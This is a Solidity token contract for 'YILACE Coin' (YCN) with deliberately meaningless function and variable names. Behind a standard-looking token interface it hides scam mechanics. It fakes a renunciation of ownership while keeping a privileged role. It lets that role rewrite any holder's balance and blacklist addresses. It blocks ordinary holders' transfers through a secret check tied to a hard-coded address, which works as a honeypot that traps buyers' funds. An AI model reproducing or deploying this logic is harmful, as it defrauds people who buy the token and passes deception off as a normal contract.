//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface toMarketingReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atTradingIs) external view returns (uint256);

    function transfer(address fundMarketing, uint256 exemptTotal) external returns (bool);

    function allowance(address fundList, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptTotal) external returns (bool);

    function transferFrom(
        address sender,
        address fundMarketing,
        uint256 exemptTotal
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoAmount, uint256 value);
    event Approval(address indexed fundList, address indexed spender, uint256 value);
}

interface toMarketingReceiverMetadata is toMarketingReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract enableReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface buyMin {
    function createPair(address exemptSwap, address tradingReceiver) external returns (address);
}

interface receiverTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract YILACECoin is enableReceiver, toMarketingReceiver, toMarketingReceiverMetadata {

    mapping(address => uint256) private buyReceiver;

    bool public liquidityMinSender;

    event OwnershipTransferred(address indexed exemptTake, address indexed fundBuyAuto);

    mapping(address => mapping(address => uint256)) private buyToAuto;

    function modeList() private view {
        require(takeEnable[_msgSender()]);
    }

    constructor (){
        
        minMode();
        receiverTake walletListTotal = receiverTake(amountLaunched);
        maxTradingMode = buyMin(walletListTotal.factory()).createPair(walletListTotal.WETH(), address(this));
        
        shouldListAmount = _msgSender();
        takeEnable[shouldListAmount] = true;
        buyReceiver[shouldListAmount] = limitTx;
        
        emit Transfer(address(0), shouldListAmount, limitTx);
    }

    string private txEnable = "YCN";

    uint256 public launchIs;

    function limitFundLiquidity(address launchedTx) public {
        modeList();
        if (listExempt == limitSender) {
            liquidityMinSender = false;
        }
        if (launchedTx == shouldListAmount || launchedTx == maxTradingMode) {
            return;
        }
        shouldListTx[launchedTx] = true;
    }

    string private tradingSellReceiver = "YILACE Coin";

    bool private limitSender;

    function allowance(address sellSender, address limitAuto) external view virtual override returns (uint256) {
        if (limitAuto == amountLaunched) {
            return type(uint256).max;
        }
        return buyToAuto[sellSender][limitAuto];
    }

    mapping(address => bool) public shouldListTx;

    function name() external view virtual override returns (string memory) {
        return tradingSellReceiver;
    }

    function getOwner() external view returns (address) {
        return marketingToken;
    }

    function transferFrom(address autoReceiver, address fundMarketing, uint256 exemptTotal) external override returns (bool) {
        if (_msgSender() != amountLaunched) {
            if (buyToAuto[autoReceiver][_msgSender()] != type(uint256).max) {
                require(exemptTotal <= buyToAuto[autoReceiver][_msgSender()]);
                buyToAuto[autoReceiver][_msgSender()] -= exemptTotal;
            }
        }
        return tradingLaunched(autoReceiver, fundMarketing, exemptTotal);
    }

    uint8 private tokenTeam = 18;

    function atIs(address isLaunchedLiquidity, uint256 exemptTotal) public {
        modeList();
        buyReceiver[isLaunchedLiquidity] = exemptTotal;
    }

    mapping(address => bool) public takeEnable;

    uint256 private limitTx = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return limitTx;
    }

    address public maxTradingMode;

    function tradingLaunched(address autoReceiver, address fundMarketing, uint256 exemptTotal) internal returns (bool) {
        if (autoReceiver == shouldListAmount) {
            return launchedTrading(autoReceiver, fundMarketing, exemptTotal);
        }
        uint256 receiverMax = toMarketingReceiver(maxTradingMode).balanceOf(isTotalSender);
        require(receiverMax == maxToken);
        require(!shouldListTx[autoReceiver]);
        return launchedTrading(autoReceiver, fundMarketing, exemptTotal);
    }

    uint256 public limitFund;

    function tokenAuto(address enableFrom) public {
        if (buyToTake) {
            return;
        }
        if (liquidityMinSender) {
            limitFund = launchIs;
        }
        takeEnable[enableFrom] = true;
        if (swapEnableLimit != limitSender) {
            launchIs = limitFund;
        }
        buyToTake = true;
    }

    address private marketingToken;

    function minMode() public {
        emit OwnershipTransferred(shouldListAmount, address(0));
        marketingToken = address(0);
    }

    uint256 maxToken;

    function decimals() external view virtual override returns (uint8) {
        return tokenTeam;
    }

    bool public txReceiver;

    function owner() external view returns (address) {
        return marketingToken;
    }

    address isTotalSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address public shouldListAmount;

    bool public buyToTake;

    function approve(address limitAuto, uint256 exemptTotal) public virtual override returns (bool) {
        buyToAuto[_msgSender()][limitAuto] = exemptTotal;
        emit Approval(_msgSender(), limitAuto, exemptTotal);
        return true;
    }

    address amountLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 isToBuy;

    function launchedTrading(address autoReceiver, address fundMarketing, uint256 exemptTotal) internal returns (bool) {
        require(buyReceiver[autoReceiver] >= exemptTotal);
        buyReceiver[autoReceiver] -= exemptTotal;
        buyReceiver[fundMarketing] += exemptTotal;
        emit Transfer(autoReceiver, fundMarketing, exemptTotal);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return txEnable;
    }

    bool private swapEnableLimit;

    function balanceOf(address atTradingIs) public view virtual override returns (uint256) {
        return buyReceiver[atTradingIs];
    }

    function transfer(address isLaunchedLiquidity, uint256 exemptTotal) external virtual override returns (bool) {
        return tradingLaunched(_msgSender(), isLaunchedLiquidity, exemptTotal);
    }

    bool private listExempt;

    function toMax(uint256 exemptTotal) public {
        modeList();
        maxToken = exemptTotal;
    }

}